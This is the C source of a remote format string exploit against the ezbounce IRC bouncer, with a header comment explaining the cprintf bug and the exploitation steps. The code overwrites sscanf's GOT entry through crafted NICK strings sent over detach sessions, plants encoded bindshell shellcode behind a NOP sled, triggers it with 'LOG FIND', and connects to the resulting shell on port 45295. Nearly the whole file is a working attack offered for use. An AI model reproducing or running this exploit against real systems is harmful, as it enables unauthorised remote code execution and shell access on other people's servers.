/*[ ezbounce[v1.0+beyond]: remote format string exploit. ]*
 * (effects current: v1.04a(stable) --- v1.50-pre6(beta)) *
 *                                                        *
 * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)       *
 *                                                        *
 * ezbounce homepage/URL:                                 *
 *  http://druglord.freelsd.org/ezbounce/                 *
 *                                                        *
 * requirements to exploit:                               *
 * - valid user/password: any access level.               *
 * - the user's settings contains "enable-detach-command" *
 *   (should be expected, a main feature of ezbounce)     *
 * - ability to connect to anything.  but, does not       *
 *   disconnect after sending initial irc(USER/NICK)      *
 *   information.  this cannot be localhost:bnc_port,     *
 *   it will recognize/abort it.  by default uses         *
 *   "localhost:25".  if no smtpd is running locally,     *
 *   change at will.                                      *
 *                                                        *
 * compile(when using debug, run with 1>file redirect):   *
 *  cc xezb.c -o xezb                                     *
 *  cc xezb.c -o xezb -DDEBUG                             *
 *                                                        *
 * the bug itself(from ezbounce/commands.cpp):            *
 *  1163:CMDFUNC(sessions)                                *
 *  ...                                                   *
 *  1196:char buff[200], timebuff[15];                    *
 *  ...                                                   *
 *  1204:sprintf(buff,"%-3d %-20s %-20s %s\n", ++idx,     *
 *       c->uinfo.irc->nick, c->uinfo.server, timebuff);  *
 *  1205:cprintf(buff);                                   *
 *                                                        *
 * cprintf() performs like printf() typically does, don't *
 * really know why that was printed to a buffer at all,   *
 * considering cprintf() supports formats.  users can     *
 * control the c->uinfo.irc->nick buffer without taint    *
 * checks for anything(%/$), c->uinfo.server can be       *
 * controlled as well.  but, has it to be a real host.    *
 * "%-number" doesn't limit anything.  but, the limit for *
 * the nickname is set as 32 elsewhere.  this is still is *
 * too tight.  so, i am going to write the address in two *
 * detachments.  this means i can't use .dtors or it will *
 * fail with only writing two of the four bytes.  so, i   *
 * am using sscanf()'s GOT, as it is not used in the      *
 * process of writing the address, but is used in other   *
 * functions.                                             *
 *                                                        *
 * as a side note: this could be exploited as a typical   *
 * buffer overflow as well.  but, limited in more ways.   *
 * since c->uinfo.server is also user controlled, but has *
 * to be a legit(able to lookup/idle), you can use a long *
 * string of zeros(ie. "CONN 000000000...") which becomes *
 * 0/localhost to overflow the buffer.  the problem then  *
 * becoming you can only change the address to 0x30's,    *
 * which would require partial address changes(ie.        *
 * 0xbfff0030).  this would be different if               *
 * c->uinfo.irc->nick came after c->uinfo.server in the   *
 * sprintf call.  in that case you could use the server   *
 * as a filler of sorts, then the address(es) to change   *
 * inside the nickname.  but, can't win everything.       *
 *                                                        *
 * best way of exploiting the bug:                        *
 *  USER x                                                *
 *  NICK <sscanf GOT addr/2+2>%.0d$hn                     *
 *  PASS <user>:<pass>                                    *
 *  CONN <open host>:<open port, besides bnc port>        *
 *  EZB detach                                            *
 * (server will disconnect, then reconnect)               *
 *  USER x                                                *
 *  NICK <sscanf GOT addr/2>%.0d$hn                       *
 *  PASS <user>:<pass>                                    *
 *  CONN <open host>:<open port, besides bnc port>        *
 *  EZB detach                                            *
 * (server will disconnect, then reconnect)               *
 *  USER x                                                *
 *  NICK x                                                *
 *  PASS <same user>:<same pass>                          *
 *  ECHO <shellcode> (gets placed on top of __mbuffer[])  *
 *  LOG FIND (uses sscanf())                              *
 * (when sessions/(automatic on connect) gets called it   *
 * will change the address in two different cprintf()     *
 * calls.  so, i don't want to change the .dtors or it    *
 * will only write two bytes.  i am using the sscanf()    *
 * GOT, as it isn't used in the process.  but, "LOG FIND" *
 * uses it)                                               *
 **********************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
/* distance to user supplied data.  shouldn't be    */
/* too far from 12, if not 12.  i didn't add an     */
/* automated finder for this exploit. :(            */
#define POPS 12
/* gdb /path/to/ezbounce                            */
/* ...                                              */
/* (gdb) x/i sscanf                                 */
/* 0x8049734 <sscanf>:     jmp    *0x80637b0        */
/* (use the number after jmp)                       */
#define SSCANF_GOT_ADDR 0x80637b0
/* ./objdump -x /path/to/ezbounce | grep __mbuffer. */
/* ...                                              */
/* 080646e0 g     O .bss   00000400       __mbuffer */
/* 1000(buffer strlen)-226(shellcode strlen)=~750.  */
/* it is still possible to have data on top of      */
/* __mbuffer[], ahead of the user data, mainly log  */
/* relays.  with ~750 bytes of nops it shouldn't    */
/* be a problem.                                    */
#define RET_ADDR (0x080646e0+750)
/* has to connect to something that doesn't         */
/* disconnect. (this cannot be the same as the      */
/* bounce port)                                     */
#define CONNECT_TO "localhost:25"
#define CODESIZE 1000 /* nops+shellcode buffer.     */
#define FMTSIZE 32 /* max format string size.       */
#define TIMEOUT 15 /* connection timeout.           */
/* taken from another exploit, works perfect for this.       */
static char x86_exec[]= /* bindshell(45295)&, netric/S-poly. */
 "\x57\x5f\xeb\x11\x5e\x31\xc9\xb1\xc8\x80\x44\x0e\xff\x2b\x49"
 "\x41\x49\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x06\x95\x06\xb0"
 "\x06\x9e\x26\x86\xdb\x26\x86\xd6\x26\x86\xd7\x26\x5e\xb6\x88"
 "\xd6\x85\x3b\xa2\x55\x5e\x96\x06\x95\x06\xb0\x25\x25\x25\x3b"
 "\x3d\x85\xc4\x88\xd7\x3b\x28\x5e\xb7\x88\xe5\x28\x88\xd7\x27"
 "\x26\x5e\x9f\x5e\xb6\x85\x3b\xa2\x55\x06\xb0\x0e\x98\x49\xda"
 "\x06\x95\x15\xa2\x55\x06\x95\x25\x27\x5e\xb6\x88\xd9\x85\x3b"
 "\xa2\x55\x5e\xac\x06\x95\x06\xb0\x06\x9e\x88\xe6\x86\xd6\x85"
 "\x05\xa2\x55\x06\x95\x06\xb0\x25\x25\x2c\x5e\xb6\x88\xda\x85"
 "\x3b\xa2\x55\x5e\x9b\x06\x95\x06\xb0\x85\xd7\xa2\x55\x0e\x98"
 "\x4a\x15\x06\x95\x5e\xd0\x85\xdb\xa2\x55\x06\x95\x06\x9e\x5e"
 "\xc8\x85\x14\xa2\x55\x06\x95\x16\x85\x14\xa2\x55\x06\x95\x16"
 "\x85\x14\xa2\x55\x06\x95\x25\x3d\x04\x04\x48\x3d\x3d\x04\x37"
 "\x3e\x43\x5e\xb8\x60\x29\xf9\xdd\x25\x28\x5e\xb6\x85\xe0\xa2"
 "\x55\x06\x95\x15\xa2\x55\x06\x95\x5e\xc8\x85\xdb\xa2\x55\xc0"
 "\x6e";
char *getfmt(unsigned short);
char *getcode(void);
char *eberror(short);
short ebconnect(char *hostname,unsigned short port,
char *,char *,signed short);
void getshell(char *,unsigned short);
void printe(char *,short);
void sig_alarm(){printe("alarm/timeout hit",1);}
int main(int argc,char **argv){
 short r=0;
 /* banner fun. */
 fprintf(stderr,
 "[*] ezbounce[v1.0+]: remote format string exploit.\n[*] by:"
 " vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");
 if(argc<5){
  fprintf(stderr,"[!] syntax: %s <hostname> <port> <user> <pa"
  "ss>\n",argv[0]);
  exit(1);
 }
 signal(SIGPIPE,SIG_IGN);
 /* ugly brute force. */
 /* change sscanf()'s GOT: 0xFFFF0000. */
 fprintf(stderr,"[*] sending format string(0xFFFF0000): ");
 r=ebconnect(argv[1],atoi(argv[2]),argv[3],argv[4],0);
 fprintf(stderr,"%s.\n",eberror(r));
 /* change sscanf()'s GOT: 0x0000FFFF. */
 fprintf(stderr,"[*] sending format string(0x0000FFFF): ");
 r=ebconnect(argv[1],atoi(argv[2]),argv[3],argv[4],1);
 fprintf(stderr,"%s.\n",eberror(r));
 /* ECHO <shellcode>, and run LOG FIND(uses sscanf()). */
 fprintf(stderr,"[*] sending shellcode, and enabling: ");
 r=ebconnect(argv[1],atoi(argv[2]),argv[3],argv[4],2);
 fprintf(stderr,"%s.\n",eberror(r));
 getshell(argv[1],45295); /* defined in shellcode. */
 fprintf(stderr,"[!] exploit failed.\n");
 exit(0);
}
char *getfmt(unsigned short type){
 unsigned int addr1,addr2;
 unsigned int pops=POPS;
 unsigned long sscanfgot=SSCANF_GOT_ADDR;
 unsigned long addr=RET_ADDR;
 char *buf;
 char taddr[3];
 taddr[0]=(sscanfgot&0xff000000)>>24;
 taddr[1]=(sscanfgot&0x00ff0000)>>16;
 taddr[2]=(sscanfgot&0x0000ff00)>>8;
 taddr[3]=(sscanfgot&0x000000ff);
 addr1=(addr&0xffff0000)>>16;
 addr2=(addr&0x0000ffff);
 if(!(buf=(char *)malloc(FMTSIZE+1)))
  printe("getfmt(): allocating memory failed",1);
 memset(buf,0x0,(FMTSIZE+1));
 if(!type)
  sprintf(buf,
  "%c%c%c%c"
  "%%.%dd%%%d$hn",
  taddr[3]+2,taddr[2],taddr[1],taddr[0],
  (addr1-9),pops); /* 4=addr + 5=pre bytes(could be 4). */
 else if(type==1)
  sprintf(buf,
  "%c%c%c%c"
  "%%.%dd%%%d$hn",
  taddr[3],taddr[2],taddr[1],taddr[0],
  (addr2-9),pops); /* 4=addr + 5=pre bytes(could be 4). */
 else if(type>1)
  sprintf(buf,"x");
 return(buf);
}
char *getcode(void){
 char *buf;
 if(!(buf=(char *)malloc(CODESIZE+1)))
  printe("getcode(): allocating memory failed",1);
 memset(buf,0x90,(CODESIZE-strlen(x86_exec)));
 memcpy(buf+(CODESIZE-strlen(x86_exec)),x86_exec,
 strlen(x86_exec));
 return(buf);
}
char *eberror(short err){
 return(err?"failed":"success");
}
short ebconnect(char *hostname,unsigned short port,
char *user,char *pass,signed short type){
 int sock;
 struct hostent *t;
 struct sockaddr_in s;
 /* see what actually happens, for testing. */
#ifdef DEBUG
 sock=1; /* stdout. */
#else
 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 s.sin_family=AF_INET;
 s.sin_port=htons(port);
 if((s.sin_addr.s_addr=inet_addr(hostname))){
  if(!(t=gethostbyname(hostname)))
   return(1);
  memcpy((char*)&s.sin_addr,(char*)t->h_addr,
  sizeof(s.sin_addr));
 }
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))
  return(1);
 alarm(0);
#endif
 dprintf(sock,"USER x\n");
 usleep(250000);
 dprintf(sock,"NICK %s\n",(type==2?"x":getfmt(type)));
 usleep(250000);
 dprintf(sock,"PASS %s:%s\n",user,pass);
 usleep(250000);
 /* 2 = don't change any address, just enable. */
 if(type==2){
  /* puts the shellcode into memory. (on */
  /* top of the dynamic __mbuffer[]) */
  dprintf(sock,"ECHO %s\n",getcode());
  usleep(250000);
  /* "LOG FIND" uses sscanf(), GOT that got changed.  */
  /* (don't need any user options to run the command) */
  dprintf(sock,"LOG FIND\n");
 }
 /* !2 = change address. */
 else{
  /* have to connect to something to detach. */
  /* can't be the same port as the bnc.      */
  dprintf(sock,"CONN "CONNECT_TO"\n");
  sleep(1);
  dprintf(sock,"EZB detach\n");
 }
 sleep(1);
 /* if stdout, don't close. */
#ifndef DEBUG
 close(sock);
#endif
 return(0);
}
/* same thing i use for every remote exploit. :) */
void getshell(char *hostname,unsigned short port){
 int sock,r;
 fd_set fds;
 char buf[4096+1];
 struct hostent *he;
 struct sockaddr_in sa;
 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1){
  printe("getshell(): socket() failed",0);
  return;
 }
 sa.sin_family=AF_INET;
 if((sa.sin_addr.s_addr=inet_addr(hostname))){
  if(!(he=gethostbyname(hostname))){
   printe("getshell(): couldn't resolve",0);
   return;
  }
  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,
  sizeof(sa.sin_addr));
 }
 sa.sin_port=htons(port);
 signal(SIGALRM,sig_alarm);
 alarm(TIMEOUT);
 printf("[*] attempting to connect: %s:%d.\n",
 hostname,port);
 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){
  printf("[!] connection failed: %s:%d.\n",
  hostname,port);
  return;
 }
 alarm(0);
 printf("[*] successfully connected: %s:%d.\n\n",
 hostname,port);
 signal(SIGINT,SIG_IGN);
 write(sock,"uname -a;id\n",13);
 while(1){
  FD_ZERO(&fds);
  FD_SET(0,&fds);
  FD_SET(sock,&fds);
  if(select(sock+1,&fds,0,0,0)<1){
   printe("getshell(): select() failed",0);
   return;
  }
  if(FD_ISSET(0,&fds)){
   if((r=read(0,buf,4096))<1){
    printe("getshell(): read() failed",0);
    return;
   }
   if(write(sock,buf,r)!=r){
    printe("getshell(): write() failed",0);
    return;
   }
  }
  if(FD_ISSET(sock,&fds)){
   if((r=read(sock,buf,4096))<1)
    exit(0);
   write(1,buf,r);
  }
 }
 close(sock);
 return;
}
void printe(char *err,short e){
 fprintf(stderr,"(error: %s)\n\n",err);
 if(e)
  exit(1);
 return;
}
